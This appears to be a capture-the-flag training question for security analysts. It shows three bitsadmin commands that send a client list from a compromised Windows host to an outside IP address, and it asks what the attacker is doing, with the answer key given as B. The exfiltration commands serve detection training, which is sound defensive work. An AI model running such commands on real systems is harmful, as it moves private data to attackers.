![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Easy CTF 1 - Spot the BITS Job

You are reviewing commands run on a compromised Windows endpoint. An analyst pulled the following from the command history:

```cmd
bitsadmin /create datatransfer
bitsadmin /addfile datatransfer C:\Users\jsmith\Documents\client_list.xlsx http://185.220.101.47/upload/client_list.xlsx
bitsadmin /resume datatransfer
```

---

## Question

What is the attacker trying to do with these commands?

---

## Flags (Choose One)

- **A)** Download a Windows update from Microsoft's servers
- **B)** Upload a sensitive file to an external server using BITS
- **C)** Create a scheduled task to run at startup
- **D)** Scan the network for open ports

---

Correct Flag: **B**

---

# Finished?
[Next Question](BITS_easy-2.md)  
[Back to Card's Main Page](/Cards/C2E/Backround_Intelligent_Transfer_Service_As_Exfil.md)
